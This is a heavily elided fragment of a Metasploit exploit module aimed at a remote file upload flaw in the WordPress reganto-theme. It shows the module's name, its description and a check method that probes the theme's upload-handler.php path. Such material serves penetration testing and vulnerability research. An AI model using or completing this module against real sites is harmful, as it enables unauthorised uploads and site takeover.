...
class Metasploit3 < Msf::Exploit::Remote
    ...
    def initialize(info = {})
        super(update_info(info,
            'Name'           => 'WordPress reganto-theme Remote File Upload Vulnerability',
            'Description'    => %q{
                    This module exploits a vulnerability found in Wp reganto-theme By abusing the upload-handler.php file,
    ...
    def check
        ...
        res = send_request_cgi({
            'method' => 'GET',
            'uri'    => "#{uri}wp-content/themes/reganto-theme/functions/upload-handler.php"
        })
